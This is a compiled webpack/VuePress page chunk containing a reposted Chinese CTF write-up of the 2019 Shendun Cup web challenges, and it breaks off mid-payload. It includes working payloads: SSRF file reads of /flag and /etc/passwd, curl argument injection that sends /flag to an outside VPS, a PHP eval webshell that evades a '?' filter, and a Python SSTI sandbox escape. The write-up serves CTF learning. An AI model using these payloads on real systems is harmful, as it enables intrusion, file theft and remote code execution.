(window.webpackJsonp=window.webpackJsonp||[]).push([[25],{379:function(t,s,a){"use strict";a.r(s);var n=a(0),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("p",[t._v("2019ç¥ç›¾æ¯æ˜¯æœ¬äººå‚åŠ çš„ç¬¬ä¸€æ¬¡CTFæ¯”èµ›ã€‚")]),t._v(" "),a("p",[t._v("æœ¬é¢˜è§£è½¬è½½è‡ª"),a("a",{attrs:{href:"https://mochazz.github.io/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Mochazz's blog"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("åŸæ–‡é“¾æ¥ï¼š"),a("a",{attrs:{href:"https://mochazz.github.io/2019/06/14/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://mochazz.github.io/2019/06/14/2019ç¥ç›¾æ¯ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨ç«èµ›Webé¢˜è§£/"),a("OutboundLink")],1)]),t._v(" "),a("hr"),t._v(" "),a("p",[t._v("æœ¬åœºæ¯”èµ›Webç±»é¢˜ç›®å…±æœ‰11é¢˜ï¼Œæœ¬WPä»…å†™äº†å…¶ä¸­10é¢˜ï¼Œç”±äºç¯å¢ƒå…³é—­ï¼Œå‰©ä½™ä¸€é¢˜æœªèƒ½å¤ç›˜ã€‚")]),t._v(" "),a("h2",{attrs:{id:"easyadmin"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#easyadmin"}},[t._v("#")]),t._v(" easyadmin")]),t._v(" "),a("p",[t._v("cookieä½¿ç”¨äº†jwtï¼Œçˆ†ç ´keyå¹¶ä¼ªé€ roleå€¼ä¸ºadminï¼Œç™»é™†å³å¯è·å¾—flag")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/1.png",alt:"1"}})]),t._v(" "),a("h2",{attrs:{id:"easygallery"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#easygallery"}},[t._v("#")]),t._v(" easygallery")]),t._v(" "),a("p",[t._v("HTMLæºç é‡Œé¢æç¤º")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$flag")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'flag in the /flag'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("è¿˜æœ‰ä¸€ä¸ªå¦‚ä¸‹é“¾æ¥ï¼š"),a("code",[t._v("http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg")])]),t._v(" "),a("p",[t._v("çŒœæµ‹å¯èƒ½æ˜¯SSSRFè¯»å–/flagã€‚å…ˆåœ¨è‡ªå·±VPSä¸Šéšä¾¿å†™ä¸€ä¸ª "),a("code",[t._v("<?php phpinfo();?>")]),t._v(" ï¼Œç„¶åè®©é¢˜ç›®å°è¯•åŠ è½½")]),t._v(" "),a("p",[a("code",[t._v("http://xxxx/gallery.php?path=http://VPS/index.php")])]),t._v(" "),a("p",[t._v("å‘ç°æ˜¯ç©ºçš„ï¼Œæ€€ç–‘æ˜¯ä¸æ˜¯æœ‰åç¼€jpgé™åˆ¶ï¼Œæ‰€ä»¥å°è¯•")]),t._v(" "),a("p",[a("code",[t._v("http://xxxx/gallery.php?path=http://VPS/index.php%23.jpg")])]),t._v(" "),a("p",[t._v("å‘ç°é¢˜ç›®æˆåŠŸè®¿é—®äº†æˆ‘çš„VPSï¼Œå¹¶è·å¾—äº†PHPINFOå†…å®¹ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±åŒæ ·å°è¯•ä½¿ç”¨fileåè®®è¯»å–/flagã€‚è¿™é‡Œä¹‹æ‰€ä»¥åŠ ä¸€ä¸ª%23ï¼Œæ˜¯å› ä¸ºåœ¨HTMLä¸­ï¼Œ%23æ˜¯é”šç‚¹ï¼Œæ‰€ä»¥åç«¯ç¨‹åºè·å¾—çš„pathå‚æ•°å¯¹åº”çš„å€¼ä¸º "),a("code",[t._v("file:///flag")]),t._v(" ï¼Œè€ŒåŠ äº†%23.jpgåˆå¯ä»¥ç»•è¿‡é¢˜ç›®é™åˆ¶ã€‚è¿˜å¯ä»¥çœ‹ä¸€ä¸‹åç«¯æ˜¯ä½¿ç”¨ä»€ä¹ˆç¨‹åºå‘èµ·è¯·æ±‚çš„ï¼š")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/2.png",alt:"2"}})]),t._v(" "),a("p",[t._v("æœ€ç»ˆpayloadï¼š"),a("code",[t._v("http://xxxx/gallery.php?path=file:///flag%23.jpg")])]),t._v(" "),a("h2",{attrs:{id:"easygallery-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#easygallery-2"}},[t._v("#")]),t._v(" easygallery-2")]),t._v(" "),a("p",[t._v("åŒæ ·ï¼Œåœ¨HTMLæºç é‡Œé¢æœ‰è¿™æ ·ä¸€ä¸ªé“¾æ¥")]),t._v(" "),a("p",[a("code",[t._v("http://xxx/download.php?f=http://127.0.0.1/img/portfolio-1.jpg")])]),t._v(" "),a("p",[t._v("è¿™æ¬¡å†ä½¿ç”¨"),a("code",[t._v("file:///flag%23.jpg")]),t._v("ä¼šæç¤ºscheme error!ï¼Œè¯´æ˜åç«¯ä»£ç å¯èƒ½ç¦ç”¨äº†fileåè®®ã€‚ä½¿ç”¨ä¸Šé¢˜ç›¸åŒçš„æ–¹æ³•ï¼Œå¯ä»¥å‘ç°åå°ä½¿ç”¨çš„æ˜¯curlæ¥è®¿é—®æˆ‘ä»¬çš„VPSã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/3.png",alt:"3"}})]),t._v(" "),a("p",[t._v("çŒœæµ‹åå°å¯èƒ½æ˜¯ç›´æ¥ç”¨æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œç„¶åæ‰§è¡Œcurlå‘½ä»¤ã€‚å°è¯•è®¿é—®")]),t._v(" "),a("p",[a("code",[t._v("http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+mochazz%23.jpg")])]),t._v(" "),a("p",[t._v("å‘ç°å…¶è¯·æ±‚æ˜¯ POSTæ–¹å¼ï¼Œæ‰€ä»¥è¿™é¢˜å¾ˆæœ‰å¯èƒ½æ˜¯å‘½ä»¤æ‰§è¡Œã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/4.png",alt:"4"}})]),t._v(" "),a("p",[t._v("å°è¯•ä½¿ç”¨")]),t._v(" "),a("p",[a("code",[t._v("http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+/flag%23.jpg")])]),t._v(" "),a("p",[t._v("æ²¡æœ‰è·å¾—flagï¼Œç»§ç»­å°è¯•curlçš„-Få‚æ•°ã€‚æœ€ç»ˆpayloadï¼š")]),t._v(" "),a("p",[a("code",[t._v("http://xxxx/download.php?f=http://VPS/index.php+-F+myflag=@/flag+-F+x=mochazz.jpg")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/5.png",alt:"5"}})]),t._v(" "),a("h2",{attrs:{id:"easyupload"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#easyupload"}},[t._v("#")]),t._v(" easyupload")]),t._v(" "),a("p",[t._v("ä¸Šä¼ æ–‡ä»¶åæ²¡æœ‰å›æ˜¾æ–‡ä»¶åœ°å€ï¼Œä½†ä»¥base64å›¾ç‰‡å½¢å¼æ˜¾ç¤ºã€‚pageå‚æ•°å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯è¿‡æ»¤äº†://æ— æ³•ä½¿ç”¨phpä¼ªåè®®è¯»å–æºç ã€‚åå°ä»£ç åº”è¯¥ç±»ä¼¼ "),a("code",[t._v("include $_GET['page'].'.php';")]),t._v(" ã€‚ä¸Šä¼ zipæ–‡ä»¶æ—¶ï¼Œè¿˜ä¼šæ˜¾ç¤º "),a("code",[t._v("ä¸å…è®¸çš„æ–‡ä»¶ç±»å‹!upload jpg or gif")]),t._v(" ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/6.png",alt:"6"}})]),t._v(" "),a("p",[t._v("ä¸Šä¼ å›¾ç‰‡å¤„è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥å¡«åœ¨çº¿å›¾ç‰‡åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é‡Œç»“åˆfileåè®®è¯»å–/etc/passwd")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/7.png",alt:"7"}})]),t._v(" "),a("p",[t._v("æºç é‡Œé¢base64è§£å¯†å°±æ˜¯æ–‡ä»¶å†…å®¹ã€‚å°è¯•è¯»å– "),a("code",[t._v("/var/www/html/index.php")]),t._v(" ç­‰æ–‡ä»¶éƒ½å¤±è´¥äº†ï¼Œå¯èƒ½ç½‘ç«™è·¯å¾„ä¸æ˜¯è¿™ä¸ªã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ "),a("code",[t._v("file:///proc/self/cwd/index.php")]),t._v(" è·å¾—index.phpæ–‡ä»¶ã€‚åœ¨linuxä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªPIDï¼Œè€Œ/proc/xxx/ä¸‹å­˜æ”¾ç€ä¸è¯¥è¿›ç¨‹ç›¸å…³çš„ä¿¡æ¯ï¼ˆè¿™é‡Œçš„xxxå°±æ˜¯PIDï¼‰ã€‚/proc/xxx/ä¸‹çš„cwdæ˜¯è½¯é“¾æ¥ï¼Œselfè¡¨ç¤ºæœ¬è¿›ç¨‹ã€‚å½“æˆ‘ä»¬é€šè¿‡è®¿é—®Apacheè¿è¡Œçš„ç½‘ç«™æ—¶ï¼Œ/proc/self/cwd/å°±ç›¸å½“äºapacheçš„æ ¹ç›®å½•ï¼Œä¾‹å¦‚æˆ‘æœ¬æœºApacheçš„æ ¹ç›®å½•æ˜¯/var/www/html")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/8.png",alt:"8"}})]),t._v(" "),a("p",[t._v("file:///proc/self/cwd/index.php")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/9.png",alt:"9"}})]),t._v(" "),a("p",[t._v("file:///proc/self/cwd/upload.php")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/10.png",alt:"10"}})]),t._v(" "),a("p",[t._v("è¿™é¢˜æˆ‘ä»¬å‰é¢è¯´è¿‡å¯ä»¥ç›´æ¥æ·»åŠ GIF89aä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°å›¾ç‰‡è·¯å¾„äº†ã€‚")]),t._v(" "),a("p",[t._v("è·¯å¾„å®šä¹‰åœ¨upload.phpä¸­ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$name")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_FILES")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'pic'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'name'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ext")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("pathinfo")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$name")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("PATHINFO_EXTENSION")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$filename")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("basename")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$name")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ext")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$rootpath")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ddir")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("md5")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$filename")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"."')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$name")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("p",[t._v("è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å¾—å›¾ç‰‡è·¯å¾„äº† "),a("code",[t._v("/proc/self/cwd/$rootpath")]),t._v(" ã€‚æ¥ä¸‹æ¥ç›´æ¥åˆ©ç”¨é¢˜ç›®æœ€å¼€å§‹çš„æ–‡ä»¶åŒ…å« "),a("code",[t._v("http://xxxx/index.php?page=submit")]),t._v(" ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ã€‚å‘åœ¨upload.phpä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("preg_match")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'/^ph(.*)$/i'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ext")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("in_array")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ext")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'php'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'php3'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'php4'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'php5'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'phtml'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'phps'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$rootpath")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("preg_replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"/\\?/"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("file_get_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$rootpath")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br")])]),a("p",[t._v("ä¼šæŠŠæ–‡ä»¶ä¸­çš„ "),a("code",[t._v("?")]),t._v(" å·ç»™å»æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç”¨ "),a("code",[t._v("<?php phpcode;?>")]),t._v(" è¿™ç§å†™æ³•ï¼Œè€Œè¦ç”¨ "),a("code",[t._v('<script language="php">phpinfo();@eval($_GET[_]);<\/script>')]),t._v(" æ¥ç€ç›´æ¥åŒ…å«å³å¯æ‰§è¡Œå‘½ä»¤ğŸ˜Šå½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨åŒ…å«ï¼Œç›´æ¥è®¿é—®é©¬çš„è·¯å¾„ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/11.png",alt:"11"}})]),t._v(" "),a("h2",{attrs:{id:"fast-calc-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#fast-calc-2"}},[t._v("#")]),t._v(" fast_calc_2")]),t._v(" "),a("p",[t._v("è¯·æ±‚åŒ…ç±»ä¼¼ï¼š")]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token property"}},[t._v("POST")]),t._v(" /calc.php HTTP/1.1")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Host:")]),t._v(" b4b74052eed440eb9c7899c932f61b6ce79f555733524dc2.changame.ichunqiu.com\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Upgrade-Insecure-Requests:")]),t._v(" 1\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("User-Agent:")]),t._v(" Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Accept:")]),t._v(" text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Accept-Encoding:")]),t._v(" gzip, deflate\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Accept-Language:")]),t._v(" zh-CN,zh;q=0.9\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Cookie:")]),t._v(" chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; UM_distinctid=16b3177db8f50f-05893ba84daad1-1b29140e-100200-16b3177db90396; pgv_pvi=517607424; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1559903068,1560408162; __jsluid=ab86d4cd5c34bd66f80a8891dc2e731e; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1560434036\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Connection:")]),t._v(" close\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Content-Type:")]),t._v(" application/json\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Content-Length:")]),t._v(' 27\n{"target":"/","expr":"1+1"}\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br")])]),a("p",[t._v("fuzzä¸€ä¸‹ï¼Œå‘ç°å¯èƒ½æ˜¯pythonçš„SSTI")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/12.png",alt:"12"}})]),t._v(" "),a("p",[t._v("å‘ç°banäº† "),a("code",[t._v("[]")]),t._v(" ï¼Œäºæ˜¯æœ¬åœ°æµ‹æˆåŠŸä¸€ä¸ªpayload")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__getattribute__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'__class__'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__base__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__getattribute__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__class__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__mro__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__getitem__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'__subc'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'lasses__'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__getitem__"),a("span",{pre:!0,attrs:{class:"token 